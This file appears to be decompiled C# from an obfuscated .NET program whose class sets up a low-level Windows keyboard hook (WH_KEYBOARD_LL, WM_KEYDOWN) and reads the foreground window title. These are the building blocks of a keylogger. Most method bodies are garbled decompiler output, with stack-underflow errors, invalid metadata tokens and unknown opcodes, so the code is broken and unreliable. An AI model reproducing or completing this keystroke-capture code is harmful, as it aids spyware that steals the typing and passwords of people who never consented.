using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class GClass1
{
	public delegate IntPtr GDelegate0(int nCode, IntPtr wParam, IntPtr lParam);

	private const int int_0 = 13;

	private const int int_1 = 256;

	private static readonly GDelegate0 gdelegate0_0;

	private static IntPtr intptr_0;

	private static string string_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static bool bool_0;

	public unsafe static bool Boolean_0
	{
		[CompilerGenerated]
		private get
		{
			//Discarded unreachable code: IL_000e, IL_0016, IL_0020, IL_0025
			//IL_0002: Expected native int or pointer, but got O
			//IL_0003: Invalid comparison between Unknown and I8
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Expected O, but got I8
			//IL_0025: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			long num;
			do
			{
				num = *(long*)(nint)(*(object*)(nint)/*Error near IL_0002: Stack underflow*/);
			}
			while ((long)/*Error near IL_0008: Stack underflow*/ < num || /*Error near IL_000d: Stack underflow*/< /*Error near IL_000d: Stack underflow*/);
			/*Error near IL_000d: Unknown opcode: 0xF9*/;
		}
		[CompilerGenerated]
		set
		{
			//Discarded unreachable code: IL_000e, IL_001a, IL_001f
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Expected native int or pointer, but got F8
			//IL_001f: Unknown result type (might be due to invalid IL or missing references)
			while (true)
			{
				*(_003F*)(nint)/*Error near IL_0002: Stack underflow*/ = /*Error near IL_0002: Stack underflow*/;
				*(_003F*)(nint)/*Error near IL_0004: Stack underflow*/ = /*Error near IL_0004: Stack underflow*/;
				if (/*Error near IL_0009: Stack underflow*/ < /*Error near IL_0009: Stack underflow*/)
				{
				}
			}
		}
	}

	public extern void method_0();

	public unsafe IntPtr method_1(GDelegate0 gdelegate0_1)
	{
		//IL_0012: Invalid comparison between Unknown and I4
		//IL_001a: Invalid comparison between Unknown and I
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			nuint num = checked((nuint)((ushort[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/]);
			*(int*)null = (int)(&this);
			*(byte*)num = ((byte[])4)[(object)""];
			short num2 = ((short[])/*Error near IL_0012: Stack underflow*/)[/*Error near IL_0012: Stack underflow*/];
			if ((int)/*Error near IL_0017: Stack underflow*/ > (int)num2)
			{
				ushort num3 = ((ushort[])/*Error near IL_0018: Stack underflow*/)[/*Error near IL_0018: Stack underflow*/];
				*(int*)(nint)/*Error near IL_0019: Stack underflow*/ = num3;
				nint num4 = checked((nint)/*Error near IL_001a: Stack underflow*/);
				if ((nint)/*Error near IL_001f: Stack underflow*/ < num4)
				{
					break;
				}
			}
		}
		_ = /*Error near IL_0020: Stack underflow*/- /*Error near IL_0020: Stack underflow*/;
		/*Error near IL_0020: stloc 0 (out-of-bounds)*/;
		/*Error near IL_0022: ldloca 0 (out-of-bounds)*/;
		throw (long)gdelegate0_1;
	}

	public static extern IntPtr smethod_0(int int_2, IntPtr intptr_1, IntPtr intptr_2);

	public static extern string smethod_1();

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr intptr_1, StringBuilder stringBuilder_0, int int_2);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr SetWindowsHookEx(int int_2, GDelegate0 gdelegate0_1, IntPtr intptr_1, uint uint_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool UnhookWindowsHookEx(IntPtr intptr_1);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr CallNextHookEx(IntPtr intptr_1, int int_2, IntPtr intptr_2, IntPtr intptr_3);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr GetModuleHandle(string string_1);

	public extern GClass1();

	static extern ApplicationContext smethod_2();

	static extern void smethod_3(ApplicationContext applicationContext_0);

	static extern Process smethod_4();

	static ProcessModule smethod_5(Process process_0)
	{
		/*Error: Invalid metadata token*/;
	}

	static extern string smethod_6(ProcessModule processModule_0);

	static extern void smethod_7(IDisposable idisposable_0);

	static extern int smethod_8(IntPtr intptr_1);

	static extern Encoding smethod_9();

	static byte[] smethod_10(Encoding encoding_0, string string_1)
	{
		//Discarded unreachable code: IL_0006, IL_001b, IL_0020
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Incompatible stack heights: 0 vs 1
		checked
		{
			_ = (int)/*Error near IL_0001: Stack underflow*/;
			/*Error near IL_0001: Invalid metadata token*/;
		}
	}

	static StringBuilder smethod_11(int int_2)
	{
		//Discarded unreachable code: IL_000c
		while (true)
		{
			short num = ((short[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/];
			/*OpCode not supported: Ckfinite*/;
			if (num == 0)
			{
			}
		}
	}

	static extern string smethod_12(object object_0);
}
